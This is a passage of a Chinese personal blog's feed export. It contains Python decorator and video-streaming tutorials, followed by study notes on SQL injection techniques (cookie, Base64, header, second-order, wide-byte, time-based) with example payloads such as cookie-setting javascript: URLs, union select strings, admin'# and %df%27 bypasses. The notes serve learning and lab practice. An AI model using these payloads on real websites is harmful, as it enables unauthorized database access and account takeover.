的值，并打印出该函数被调用的次数。</p><p>需要注意的是，通过将变量作为参数传递给装饰器，我们可以更灵活地控制装饰器的行为，但同时也会增加代码的复杂度。因此，在选择使用这种方式时，需要权衡利弊，并根据具体的情况选择最适合的实现方式。除了在装饰器中使用 <code>global</code> 关键字、闭包、类或参数等方式引用外部变量之外，还可以使用 <code>functools</code> 模块中的 <code>wraps</code> 装饰器来保留被装饰函数的元信息。具体来说，<code>wraps</code> 装饰器可以用来保留被装饰函数的名称、文档字符串、参数签名等元信息，从而使得被装饰函数更加易于调试和理解。</p><p>以下是一个使用 <code>wraps</code> 装饰器的示例：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> functools <span class="token keyword">import</span> wraps<span class="token keyword">def</span> <span class="token function">my_decorator</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>    @wraps<span class="token punctuation">(</span>func<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""This is a wrapper function."""</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Before the function is called."</span><span class="token punctuation">)</span>        result <span class="token operator">=</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"After the function is called."</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">return</span> wrapper@my_decorator<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""This is a function."""</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个示例中，我们使用 <code>wraps</code> 装饰器来保留被装饰函数 <code>my_function</code> 的元信息，包括其名称、文档字符串等。这使得被装饰函数的调试和理解更加容易。需要注意的是，在使用 <code>wraps</code> 装饰器时，需要将其放在装饰器函数的内部，而不是外部。</p><p>总之，通过在装饰器中使用 <code>wraps</code> 装饰器，我们可以保留被装饰函数的元信息，从而提高代码的可读性和可维护性。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;当在装饰器中使用全局变量时，需要注意以下几点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在装饰器中声明全局变量需要使用&lt;code&gt;global&lt;/code&gt;关键字。&lt;/li&gt;
&lt;li&gt;在装饰器中使用全局变量，需要确保该变量已经被定义和初始化，否则会引发&lt;code&gt;NameError&lt;/c</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Python装饰器&amp;流处理技术</title>
    <link href="https://liu1272.github.io/2023/03/19/Python%E8%A3%85%E9%A5%B0%E5%99%A8/"/>
    <id>https://liu1272.github.io/2023/03/19/Python%E8%A3%85%E9%A5%B0%E5%99%A8/</id>
    <published>2023-03-18T16:50:00.000Z</published>
    <updated>2023-03-18T16:54:07.865Z</updated>
    
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Python装饰器&amp;流处理技术</title>
    <link href="https://liu1272.github.io/2023/03/18/Python%E8%A3%85%E9%A5%B0%E5%99%A8-%E6%B5%81%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF/"/>
    <id>https://liu1272.github.io/2023/03/18/Python%E8%A3%85%E9%A5%B0%E5%99%A8-%E6%B5%81%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF/</id>
    <published>2023-03-17T16:56:00.000Z</published>
    <updated>2023-03-18T17:26:43.963Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Python装饰器"><a href="#Python装饰器" class="headerlink" title="Python装饰器"></a>Python装饰器</h3><h4 id="解释概念"><a href="#解释概念" class="headerlink" title="解释概念"></a>解释概念</h4><p>Python中的装饰器是一种用于修改或扩展函数或类的行为的语法结构。装饰器通常是一个函数或类，它接受一个函数或类作为参数，并返回一个新的函数或类。</p><p>装饰器可以用于许多不同的目的，例如：</p><ol><li>添加日志记录或调试信息，以便跟踪函数的执行过程和结果。</li><li>对函数或类的参数进行验证或修改，以确保它们符合特定的规则或格式。</li><li>对函数或类进行缓存或记忆化，以避免重复计算或提高性能。</li><li>添加身份验证或授权逻辑，以确保只有授权用户才能调用函数或类。</li><li>实现面向切面编程（AOP），以分离横切关注点（如日志记录、性能统计等）和业务逻辑。<br>Python中的装饰器使用@语法来应用，例如：<pre class="line-numbers language-python"><code class="language-python">@decorator<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># do something</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>这将把<code>my_function</code>函数传递给<code>decorator</code>装饰器函数，并将其替换为新的函数，该函数包装了原始函数并修改了其行为。</li></ol><h4 id="关于装饰器全局变量的使用（接口）"><a href="#关于装饰器全局变量的使用（接口）" class="headerlink" title="关于装饰器全局变量的使用（接口）"></a>关于装饰器全局变量的使用（接口）</h4><p>装饰器本质上是一个函数，因此它可以访问任何全局变量。<br>当在装饰器中使用全局变量时，需要注意以下几点：</p><ol><li>在装饰器中声明全局变量需要使用<code>global</code>关键字。</li><li>在装饰器中使用全局变量，需要确保该变量已经被定义和初始化，否则会引发<code>NameError</code>异常。</li><li>全局变量可能会被多个线程或进程访问，因此需要考虑并发安全问题。</li><li>在装饰器中使用全局变量可能会导致代码的可读性和可维护性降低，因此应尽可能避免使用全局变量。<br>以下是一个简单的例子，演示如何在装饰器中使用全局变量：<pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">counter</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">global</span> count     count <span class="token operator">+=</span> <span class="token number">1</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; was called &amp;#123;count&amp;#125; times."</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span> <span class="token keyword">return</span> wrapper@counter<span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello, world!"</span><span class="token punctuation">)</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Function foo was called 1 times.</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Function foo was called 2 times.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>在上面的例子中，我们定义了一个全局变量<code>count</code>，并在装饰器<code>counter</code>中使用了它。<br>装饰器<code>counter</code>用于统计函数被调用的次数，每次调用时<code>count</code>加1，并输出调用次数。<br>函数<code>foo</code>被装饰后，每次调用都会输出调用次数。</li></ol><p>除了在装饰器函数内部使用 <code>global</code> 关键字，还可以在装饰器函数外部使用 <code>global</code> 关键字来声明全局变量，并在装饰器内部访问和修改该变量的值：</p><pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> count        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    <span class="token keyword">return</span> wrapper@count_calls<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> count    <span class="token keyword">if</span> count <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hi there!"</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们声明了全局变量 <code>count</code>，并在装饰器内部和外部使用了 <code>global</code> 关键字。<br>在 <code>my_function</code> 函数内部，我们检查 <code>count</code> 的值是否为偶数，并打印不同的消息。<br>由于装饰器在每次调用 <code>my_function</code> 函数时都会增加 <code>count</code> 的值，因此 <code>my_function</code> 函数每次都会打印不同的消息。</p><p>需要注意的是，在使用全局变量时要小心，因为全局变量可能会在代码中的任何地方进行修改，这可能会导致出现意外的行为。<br>因此，最好将全局变量用于只读目的，或者在使用时采用适当的同步机制来避免竞争条件。<br>当然，除了 <code>global</code> 关键字之外，还可以使用其他的方式来在装饰器中引用外部变量。以下是一些常用的方法：</p><ol><li>使用闭包：在装饰器函数内部定义一个内部函数，并在内部函数中引用外部变量<br>（由于内部函数可以访问外部函数的变量）</li><li>使用类：将装饰器实现为一个类，并在类中引用外部变量<br>（由于类实例可以存储变量状态）</li></ol><p>无论是使用 <code>global</code> 关键字、闭包还是类，都可以在装饰器中引用外部变量。<br>除了上面所提到的方法，还可以将变量作为参数传递给装饰器。<br>这种方式通常适用于装饰器函数需要访问某些变量，但不希望将这些变量声明为全局变量的情况。</p><p>通过将变量作为参数传递给装饰器，我们可以更灵活地控制装饰器的行为，但同时也会增加代码的复杂度。因此，在选择使用这种方式时，需要权衡利弊，并根据具体的情况选择最适合的实现方式。</p><p>除了在装饰器中使用 <code>global</code> 关键字、闭包、类或参数等方式引用外部变量之外，还可以使用 <code>functools</code> 模块中的 <code>wraps</code> 装饰器来保留被装饰函数的元信息。<br>具体来说，<code>wraps</code> 装饰器可以用来保留被装饰函数的名称、文档字符串、参数签名等元信息，从而使得被装饰函数更加易于调试和理解。</p><h3 id="流处理技术"><a href="#流处理技术" class="headerlink" title="流处理技术"></a>流处理技术</h3><h4 id="概念解析"><a href="#概念解析" class="headerlink" title="概念解析"></a>概念解析</h4><p>流处理技术是一种处理数据的方式，它是指持续接收和处理流式数据的方式。<br>与批处理不同，流处理将数据视为连续的数据流，而不是离散的数据集合。</p><h4 id="应用领域"><a href="#应用领域" class="headerlink" title="应用领域"></a>应用领域</h4><p>流处理技术的主要用途是实时分析和处理数据。<br>通过流处理技术，可以快速处理大量的<code>实时数据</code>，并从中提取有价值的信息。<br>流处理技术通常使用流处理引擎来实现，流处理引擎通常提供一系列的API和工具。<br>用于处理数据流、实时处理和聚合数据、分析数据和发送数据到其他系统。<br>流处理引擎还可以与其他系统和工具集成，例如数据库、数据仓库、消息队列等。</p><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>在使用流处理技术时，需要考虑以下几个方面：<br>（1）数据来源和输入方式：从不同的数据源中读取实时数据流。<br>（2）流处理引擎的选择：根据具体的业务需求和系统架构选择适合的流处理引擎。<br>&emsp;&emsp;(Apache Flink、Apache Kafka Streams、Apache Spark Streaming等)<br>（3）数据处理逻辑：定义数据处理逻辑。<br>（4）数据输出方式：传输和存储处理后的数据。</p><h4 id="简单的示例"><a href="#简单的示例" class="headerlink" title="简单的示例"></a>简单的示例</h4><p>下面是个使用Flask和cv2框架编写的一个用于播放视频的Python流处理脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token keyword">import</span> cv2app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>camera <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoCapture<span class="token punctuation">(</span><span class="token string">"1.mp4"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">generate_frames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        success<span class="token punctuation">,</span> frame <span class="token operator">=</span> camera<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> success<span class="token punctuation">:</span>            ret<span class="token punctuation">,</span> buffer <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imencode<span class="token punctuation">(</span><span class="token string">'.jpg'</span><span class="token punctuation">,</span> frame<span class="token punctuation">)</span>            frame <span class="token operator">=</span> buffer<span class="token punctuation">.</span>tobytes<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">yield</span> <span class="token punctuation">(</span>b<span class="token string">'--frame\r\nContent-Type: image/jpeg\r\n\r\n'</span> <span class="token operator">+</span> buffer<span class="token punctuation">.</span>tobytes<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'\r\n'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">video_feed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>generate_frames<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>mimetype<span class="token operator">=</span><span class="token string">'multipart/x-mixed-replace;boundary=frame'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2023/03/19/cQ87hagSwpFA3CE.jpg" alt="效果就这样"><br>但是这样子做出来的很大缺陷:<br>1.没办法调倍速<br>2.没声音<br>3.不能循环播放之类的</p><p>但是，要想解决上面这些问题只需要再添加两行代码！！！<br>一行代码启动docker版nginx-rtmp服务<br>另一行代码使用FFmpeg推流，指定服务器地址<br>（我没试过，出问题别找我）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Python装饰器&quot;&gt;&lt;a href=&quot;#Python装饰器&quot; class=&quot;headerlink&quot; title=&quot;Python装饰器&quot;&gt;&lt;/a&gt;Python装饰器&lt;/h3&gt;&lt;h4 id=&quot;解释概念&quot;&gt;&lt;a href=&quot;#解释概念&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Cookie/Base64/HTTP头部注入</title>
    <link href="https://liu1272.github.io/2023/03/15/cookie%E6%B3%A8%E5%85%A5/"/>
    <id>https://liu1272.github.io/2023/03/15/cookie%E6%B3%A8%E5%85%A5/</id>
    <published>2023-03-15T14:30:00.000Z</published>
    <updated>2023-03-17T05:30:58.644Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>常见于&emsp;.asp?id=xx&emsp;之类的带参数的URL</p><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>cookie是一些数据信息，类型为“小型文本文件”，存储于电脑上的文本文件中。<br>cookie是服务器创建后返回给游览器的。游览器只进行了保存。<br> 一般cookie是以键值对进行表示的(key-value)</p><pre><code>cookie常用属性的解释：       Name： cookie的名字       Value： cooke的值       Path： 定义了Web站点上可以访问该Cookie的目录       Expires： 表示cookie的过期时间，也就是有效值       Size： 表示cookie的大小</code></pre><p>cookie有2种存储方式，会话性（关浏览器就清除）和持久性（保留到有效期结束）</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>ASP脚本中的request对象，被用于从用户那里获取信息。<br>Request对象的使用方法：request.[集合名称]（参数名称）<br>但是它同时允许提交时省略集合名称<br>按QueryString、Form、Cookies、ServerVariables的顺序来获取数据的<br>所以，当未指明使用request对象的具体方法进行获取且未过滤语句时存在注入。</p><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><p>（1）寻找.asp?id=xx这样的页面<br>（2）将“id=xx”删掉，看页面是否正常。不正常则说明参数在数据传递中启直接作用<br>（3）清空网址，输入</p><pre><code>javascript:alert(document.cookie=“id=”+escape(“xx”));document.cookie:表示当前浏览器中的cookie变量alert():弹出一个对话框escape():对字符串进行编码</code></pre><p>&emsp;&emsp;按Enter键后弹出一个对话框，内容是“id=xx”<br>&emsp;&emsp;然后重新输入原来URL回车<br>&emsp;&emsp;如果显示正常，说明是用Request(“id”)方式获取数据<br>（4）判断是否存在漏洞:将SQL判断语句带入，并重复第三步</p><pre><code>javascript:alert(document.cookie=“id=”+escape(“xx and 1=1”));javascript:alert(document.cookie=“id=”+escape(“xx and 1=2”));两次回显不一样则说明存在注入漏洞，并可以进行cookie注入</code></pre><p>（5）代入SQL语句</p><pre><code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;xx order by 2&quot;));javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;284 union select 1,…… from xx&quot;));</code></pre><h3 id="Base64注入"><a href="#Base64注入" class="headerlink" title="Base64注入"></a>Base64注入</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>程序对GET的传参进行接收，并且对其进行解码，然后再放入查询语句中。<br>这时候我们可以编码，然后程序执行的时候，会把我们所编码的注入语句解码，再拼接到了原本程序要执行的代码中</p><h4 id="讲解"><a href="#讲解" class="headerlink" title="讲解"></a>讲解</h4><p>Base64注入实质上并不是一个全新的注入手段，而是一种对数据处理的方法。<br>Base64注入可以发生在cookie注入中，只要有</p><pre><code>$id = base64_decode($_GET[&#39;id&#39;]);</code></pre><p>这个函数语句，就会发生Base64的解码，甚至可以加解密成其他的格式<br>此时就需要一个个试或者进行白盒测试了。</p><h3 id="最后总结一下HTTP头部注入"><a href="#最后总结一下HTTP头部注入" class="headerlink" title="最后总结一下HTTP头部注入"></a>最后总结一下HTTP头部注入</h3><p>原理:后台开发人员为了验证客户端HTTP Header（比如常用的Cookie验证等）或者通过HTTP Header头信息获取客户端的一些信息（例如：User-Agent、Accept字段等），会对客户端HTTP Header 进行获取并使用SQL语句进行处理，如果此时没有足够的安全考虑，就可能导致基于HTTP Header的注入漏洞</p><p>使用HTTP头部注入漏洞的前提条件:<br>（1）能够对请求头消息进行修改<br>（2）修改的请求头信息能够带入数据库执行<br>（3）数据库没有对输入的请求头做过滤</p><p>常见方法:<br>Cookie注入<br>User-Agent注入<br>Referer注入<br>XFF注入（X-Forwarded-For）</p><p>如果要详细了解请自行查询。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Cookie注入&quot;&gt;&lt;a href=&quot;#Cookie注入&quot; class=&quot;headerlink&quot; title=&quot;Cookie注入&quot;&gt;&lt;/a&gt;Cookie注入&lt;/h3&gt;&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL二次注入&amp;宽字节注入</title>
    <link href="https://liu1272.github.io/2023/03/13/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    <id>https://liu1272.github.io/2023/03/13/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</id>
    <published>2023-03-12T16:15:00.000Z</published>
    <updated>2023-03-13T16:43:35.294Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SQL二次注入"><a href="#SQL二次注入" class="headerlink" title="SQL二次注入"></a>SQL二次注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>在二次注入中，一般不会是单纯的二次注入<br>通常会与报错注入或Bool盲注结合。<br>比如，在注册页面输入的用户名在登录后才有盲注的回显<br>这时候我们需要自己编写脚本模拟注册及登录。</p><p>无法通过扫描工具或者手工测试出来，二次注入一般在审计代码过程中发现<br>从前端或黑盒测试无法看到</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>攻击者构造恶意的数据并存储在数据库后<br>防御者对语句中的特殊字符进行了转义处理<br>但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中<br>当程序调用恶意数据并执行SQL查询时就发生了SQL二次注入。<br>总而言之:<br>用户输入恶意的数据库查询语句时会被转义，<br>但在数据库调用读取语句时又被还原导致语句执行。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p><strong>第一步：构造恶意语句</strong><br>没有恶意代码怎么能行？先上传含有能被转义的字符的恶意查询语句<br><strong>第二步：插入恶意数据</strong><br>传入数据并任他对其中特殊字符进行转义处理，但在保存在数据库时<strong>保留了原来的味道</strong><br><strong>第三步：二次构造语句，引用恶意数据</strong><br>因为开发者默认存在数据库里的数据都是安全的<br>所以在进行查询时，直接从数据库中取出九转大肠<br>结果如下:<br><img src="https://s2.loli.net/2023/03/13/wrX4BSlGyjPmqgH.jpg" alt="只保留了一点原始的味道"></p><h4 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="构造并存入一个恶意语句"><a href="#构造并存入一个恶意语句" class="headerlink" title="构造并存入一个恶意语句"></a>构造并存入一个恶意语句</h5><p>由于这种注入太难以被判断及发现，所以本文只作简单说明(其实是因为我太菜了)</p><pre><code>在注册等类似能上传并存储数据的页面存入admin&#39;#mysql_escape_string()等函数会在特殊字符前加 \ 造成过滤的效果</code></pre><p>此时传入时不会执行恶意代码，因为它过滤了。<br>但是存入的时候没有更改原来的数据。</p><h5 id="调用数据库中的恶意语句"><a href="#调用数据库中的恶意语句" class="headerlink" title="调用数据库中的恶意语句"></a>调用数据库中的恶意语句</h5><p>既然原来的数据没改，那就再调出来用(相当于执行了恶意代码)。</p><pre><code>下面是sqllab靶场的题，二次执行时整个语句变成了这样子update password=$new where username=admin&#39;#</code></pre><p>admin后引号对前面的单引号进行了闭合，#注释掉了后面的语句，就相当于对admin进行了改密</p><h3 id="SQL宽字节注入"><a href="#SQL宽字节注入" class="headerlink" title="SQL宽字节注入"></a>SQL宽字节注入</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>**单字节字符集:**所有的字符都使用一个字节来表示（ASCII 编码0-127）<br>**多字节字符集:**在多字节字符集中，用多个字节来表示（也有可能一部分用一个字节表示）<br>**宽字符:**用多个字节来代表的字符称之为宽字符<br>**字符、字符集:**字符是组成字符集的基本单位<br>**UTF8:**由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF。<br>**宽字节:**GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。</p><h4 id="表现-1"><a href="#表现-1" class="headerlink" title="表现"></a>表现</h4><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>1、宽字节注入是利用mysql的一个特性:<br>&emsp;&emsp;PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为\）<br>&emsp;&emsp;MYSQL默认字符集是GBK等宽字节字符集。<br>2、PHP发送请求到mysql，mysql在使用GBK编码的时候会认为两个字符是一个汉字<br>3、字符和转义的反斜杠组成了新的汉字，但是组成的新汉字又不是一个正常的汉字，就起到了注掉 \ 的作用</p><h4 id="转义函数"><a href="#转义函数" class="headerlink" title="转义函数"></a>转义函数</h4><pre><code>addslashes函数:对单引号(’)、双引号(&quot;)、反斜线(\)与x00 (NULL字符）magic_quotes_gpc函数:判断解析用户提交的数据，有post、get、cookie数据时增加转义字符“\”mysql_real_escape_string函数mysql_escape_string函数</code></pre><h4 id="注入方法-1"><a href="#注入方法-1" class="headerlink" title="注入方法"></a>注入方法</h4><p>方法一:<br>比如and’的编码是%df’，传参时单引号被加上\变成了 %df&#39;<br>其中\的十六进制是%5C ，那么现在 %df&#39; =%df%5c%27<br>如果程序的默认字符集是GBK等宽字节字符集<br>则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗</p><pre><code>也就是说:%df\&#39; = %df%5c%27=縗&#39;</code></pre><p>我们再回想到注入的三要素，有了单引号(闭合)后就好注入了</p><p>方法二:<br>使用汉字绕过。<br>PHP接收到一个汉字后通过UTF-8编码（三字节），并和\两两配对组成两个汉字，避免了后面引号的转义</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;SQL二次注入&quot;&gt;&lt;a href=&quot;#SQL二次注入&quot; class=&quot;headerlink&quot; title=&quot;SQL二次注入&quot;&gt;&lt;/a&gt;SQL二次注入&lt;/h3&gt;&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL时间注入&amp;堆叠注入</title>
    <link href="https://liu1272.github.io/2023/03/12/SQL%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5/"/>
    <id>https://liu1272.github.io/2023/03/12/SQL%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5/</id>
    <published>2023-03-12T15:11:00.000Z</published>
    <updated>2023-03-12T16:41:31.525Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SQL时间注入"><a href="#SQL时间注入" class="headerlink" title="SQL时间注入"></a>SQL时间注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>无论输入什么都会返回正常的处理信息或者页面无回显<br>能依靠自身感知到页面的延时情况</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>前端在将数据传给后台时，设置了一个if语句<br>当条件为真时执行sleep语句，条件为假时无执行语句</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>时间注入又称延时注入，与布尔盲注同属于盲注无回显的类型。<br>如果想要注入，必不可少的是得看得到效果。<br>那么有没有什么方法能直接或是间接地显示或猜解出数据呢？<br>当然有！前面就已近提到过函数这个东西了。<br>函数与and结合时，如果传入的参数正确就会触发函数，否则不执行。<br>此时将函数与查询语句结合后再与传入的参数结合就能达到最终效果了。</p><h4 id="相关函数讲解"><a href="#相关函数讲解" class="headerlink" title="相关函数讲解"></a>相关函数讲解</h4><pre><code>if(a,b,c)                如果a是TRUE(a!=0或a!=NULL)，则返回b，否则返回csleep(x)                 延时x秒if(a,b,c)                a为真，执行b；否则执行cbenchmark(a,b)           a为操作次数，b为执行的函数                         原理是通过多次操作，让极短暂的延时增加到能识别的程度                         后面几个都是这种思想笛卡尔积                  别问，老子离散数学还没学到这！get_lock(key, timeout)   key(最好是数字)指定名称获取锁，timeout指定锁定时间                         前提条件是数据库连接是长连接正则bug                  利用大量正则计算延长时间，实现延时除此之外还有case … when … then … else … end</code></pre><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><h5 